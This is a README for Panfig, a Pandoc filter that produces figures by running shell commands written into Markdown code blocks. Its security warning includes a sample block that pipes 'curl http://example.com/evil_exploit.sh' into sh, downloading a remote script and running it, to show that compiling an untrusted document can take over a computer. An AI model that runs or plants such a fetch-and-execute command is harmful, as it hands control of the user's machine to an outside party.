Pandoc Figure Framework
=======================

This library lets you write self-contained Pandoc/Markdown files containing figures.

Without Panfig, if you want figures, you have to save the image files, and the scripts that generate them, alongside the document. You'd probably even have a Makefile or something to ensure that all the figures were up to date. What a hassle!

With Panfig, the document stands alone. It describes how to generate the images, and they're generated when the document is compiled to HTML (or whatever).

For example, this Markdown code:

    Here is a very simple FSM: the "on-off automaton."

    ~~~~~~~~ {.panfig shell="dot -Tpng -o %s"}
      digraph G {
        on [style=filled];
        on -> off;
        off -> on;
      }
    ~~~~~~~~

generates HTML that looks like this:

> Here is a very simple FSM: the "on-off automaton."
>
> ![](on-off.png)



Security: for heaven's sake, be careful.
-------------------------------------

I am putting this up near the top because you should care about it.
**Panfig executes arbitrary code contained in the document being compiled. If you invoked Pandoc (+Panfig) on the following document, it would own your computer.**


    ~~~~~~~~ { .panfig shell="curl http://example.com/evil_exploit.sh | sh"}
    ~~~~~~~~


How do I use it?
----------------

1. **Install.** First things, of course, first: `pip install panfig`.

2. **Write Markdown.** In your Markdown file, where you want a figure, write a code block that describes how to generate the desired figure. For example:

        ~~~~~~~~ { .panfig shell="dot -Tpng -o %s" }
          digraph G {
            on -> off;
            off -> on;
          }
        ~~~~~~~~

    This uses Pandoc's [fenced code block](http://pandoc.org/README.html#fenced-code-blocks) syntax to give the block the `.panfig` class (to flag it for processing by Panfig), and a `shell` attribute specifying the command that will generate the figure. (It's a `printf`-style format string, so `%s` is replaced by the `sh`-escaped path to the image file that should be created.) The shell command is run, with the contents of the code block passed to the subprocess's standard input. It's that simple!

3. **Compile the document.** Invoke `pandoc` to compile the document as you normally would, but add the option `--filter panfig`. (If the `panfig` executable isn't on your default path -- for example, if you use Virtualenv -- you may need to pass the full path to the `panfig` executable, e.g. `~/.virtualenv/3.4/bin/panfig`.)


### Bells and Whistles

#### Aliases

An alias specifies a set of attributes that Panfig should pretend a block has. For example, instead of writing `shell="dot -Tpng -o %s"` for all your graphs, you could instead define an alias, like so:

        ~~~~~~~~ { .panfig-aliases }
          {"dot": {"shell": "dot -Tpng -o %s"}}
        ~~~~~~~~

        ~~~~~~~~ { .panfig alias=dot }
          digraph G { on -> off; off -> on; }
        ~~~~~~~~

This is exactly, 100% identical to

        ~~~~~~~~ { .panfig shell="dot -Tpng -o %s" }
          digraph G { on -> off; off -> on; }
        ~~~~~~~~

The body of a `.panfig-aliases` block should be a JSON object of the form `{"alias-name": {"attr": "value", ...}, ...}` -- that is, mapping alias names to objects, which in turn specify the attributes you're using the alias as a shorthand for.

Panfig comes with several aliases predefined:

- `dot`: uses `dot` to generate a PNG, e.g.

        ~~~~~~~~ { .panfig alias=dot }
          digraph G { on -> off; off -> on; }
        ~~~~~~~~

- `mathematica` uses Mathematica to generate a PNG, e.g.

        ~~~~~~~~ { .panfig alias=mathematica }
          Plot[Sin[x], {x, 0, 2 Pi}] (* last result is `Export`ed *)
        ~~~~~~~~

- `matplotlib` uses Matplotlib to generate a PNG, e.g.

        ~~~~~~~~ { .panfig alias=matplotlib }
          import numpy as np
          xs = np.linspace(0, 2*np.pi, 100)
          plt.plot(xs, np.sin(xs)) # matplotlib.pyplot is already imported as plt
          # plt.savefig() is called at the end to generate the image
        ~~~~~~~~


#### Text Processing

Often, to avoid code duplication, you'll want to massage the code block's contents in some way. Panfig supports some special attributes that will perform common massaging operations:

- `prologue="..."`: prepends the attribute-value to the block's contents (separated by a newline)
- `epilogue="..."`: appends the attribute-value to the block's contents (separated by a newline)
- `dedent=true`: removes an equal amount of whitespace (as much as possible, given that constraint) from the beginning of each line

This is all stuff that you *could* do just by constructing a fancy pipeline in your `shell` command, but... what a pain.

For example:


        ~~~~~~~~ { .panfig-aliases }
          {"fsm": {"shell": "dot -Tpng -o %s",
                   "prologue": "digraph G { _start [shape=\"none\", label=\"\"];",
                   "epilogue": "}"}}
        ~~~~~~~~

        ~~~~~~~~ {.panfig alias=fsm}
          _start -> off;
          on [shape="doublecircle"];
          on -> off;
          off -> on;
        ~~~~~~~~
